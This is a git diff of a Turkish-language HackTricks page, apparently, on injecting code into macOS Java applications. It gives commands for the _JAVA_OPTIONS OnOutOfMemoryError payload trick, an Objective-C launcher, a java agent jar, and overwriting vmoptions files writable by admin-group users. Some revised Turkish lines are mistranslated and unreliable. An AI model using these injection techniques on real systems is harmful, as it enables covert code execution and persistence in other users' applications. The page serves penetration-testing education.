@@ -1,22 +1,23 @@
 # macOS Java Uygulamaları Enjeksiyonu
 
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-HackTricks'i desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
-* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
+{% endhint %}
 
-## Numaralandırma
+## Sayım
 
-Sistemde yüklü olan Java uygulamalarını bulun. **Info.plist** içindeki Java uygulamalarının bazı java parametrelerini içerdiği ve bu parametrelerin **`java.`** dizesini içerdiği fark edildi, bu yüzden buna göre arama yapabilirsiniz:
+Sisteminizde yüklü Java uygulamalarını bulun. **Info.plist** içindeki Java uygulamalarının **`java.`** dizesini içeren bazı java parametreleri barındırdığı gözlemlenmiştir, bu nedenle bunun için arama yapabilirsiniz:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -26,13 +27,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA\_OPTIONS
 
-Çevre değişkeni **`_JAVA_OPTIONS`**, bir Java derlenmiş uygulamanın yürütülmesinde keyfi Java parametrelerinin enjekte edilmesi için kullanılabilir:
+Env değişkeni **`_JAVA_OPTIONS`** bir java derlenmiş uygulamasının yürütülmesinde rastgele java parametreleri enjekte etmek için kullanılabilir:
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-Yeni bir işlem olarak çalıştırmak için ve mevcut terminalin alt işlemi olmadan kullanabilirsiniz:
+Yeni bir işlem olarak ve mevcut terminalin bir çocuğu olarak değil, bunu çalıştırmak için şunu kullanabilirsiniz:
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -85,7 +86,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-Ancak, bu yürütülen uygulamada bir hata tetikleyecektir, daha gizli bir yol ise bir Java ajanı oluşturmak ve şunu kullanmaktır:
+Ancak, bu, çalıştırılan uygulamada bir hata tetikleyecektir, daha gizli bir yol ise bir java ajanı oluşturmak ve şunu kullanmaktır:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -95,10 +96,10 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 {% hint style="danger" %}
-Uygulamadan farklı bir Java sürümüyle ajan oluşturmak, ajanın ve uygulamanın çalışmasını çökerte bilir.
+Ajansı, uygulamadan **farklı bir Java sürümü** ile oluşturmak, hem ajansın hem de uygulamanın çalışmasını çökertilebilir.
 {% endhint %}
 
-Ajan aşağıdaki gibi olabilir:
+Ajansın nerede olabileceği:
 
 {% code title="Agent.java" %}
 ```java
@@ -124,14 +125,14 @@ Ajanı derlemek için şunu çalıştırın:
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
 ```
-`manifest.txt` dosyasıyla:
+`manifest.txt` ile:
 ```
 Premain-Class: Agent
 Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-Ve ardından çevre değişkenini ihraç edin ve java uygulamasını şu şekilde çalıştırın:
+Ve ardından env değişkenini dışa aktarın ve java uygulamasını şu şekilde çalıştırın:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -142,12 +143,12 @@ open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Profession
 ```
 ## vmoptions dosyası
 
-Bu dosya, Java çalıştırıldığında **Java parametrelerinin** belirtilebileceği bir dosyadır. Önceki hilelerden bazılarını kullanarak java parametrelerini değiştirebilir ve **işlemi keyfi komutlarla çalıştırabilirsiniz**.\
-Ayrıca, bu dosya `include` diziniyle diğer dosyaları da **dahil edebilir**, bu nedenle dahil edilen bir dosyayı da değiştirebilirsiniz.
+Bu dosya, Java çalıştırıldığında **Java parametrelerinin** belirtilmesini destekler. Java parametrelerini değiştirmek ve **sürecin rastgele komutlar çalıştırmasını sağlamak** için önceki hilelerden bazılarını kullanabilirsiniz.\
+Ayrıca, bu dosya `include` dizini ile **başka dosyaları da içerebilir**, böylece dahil edilen bir dosyayı da değiştirebilirsiniz.
 
-Dahası, bazı Java uygulamaları birden fazla `vmoptions` dosyası **yükleyebilir**.
+Dahası, bazı Java uygulamaları **birden fazla `vmoptions`** dosyasını **yükleyecektir**.
 
-Android Studio gibi bazı uygulamalar, bu dosyaların **nerede arandığını** çıktılarında belirtir, örneğin:
+Android Studio gibi bazı uygulamalar, bu dosyaları nerede aradıklarını **çıktılarında belirtir**, şöyle:
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -158,7 +159,7 @@ Android Studio gibi bazı uygulamalar, bu dosyaların **nerede arandığını** 
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-Eğer yapmazlarsa, bunu kolayca kontrol edebilirsiniz:
+Eğer yapmıyorsanız, bunu kolayca kontrol edebilirsiniz:
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -166,18 +167,4 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-İlginç olan şudur ki, bu örnekte Android Studio, herhangi bir **`admin` grubundaki kullanıcının yazma erişimine sahip olduğu** **`/Applications/Android Studio.app.vmoptions`** dosyasını yüklemeye çalışıyor.
-
-<details>
-
-<summary><strong>AWS hackleme konusunda sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>'ı öğrenin!</strong></summary>
-
-HackTricks'i desteklemenin diğer yolları:
-
-* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
-* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.
-
-</details>
+Not edin ki bu örnekte Android Studio'nun **`/Applications/Android Studio.app.vmoptions`** dosyasını yüklemeye çalışması oldukça ilginçtir; bu, **`admin` grubundaki** herhangi bir kullanıcının yazma erişimine sahip olduğu bir yerdir.
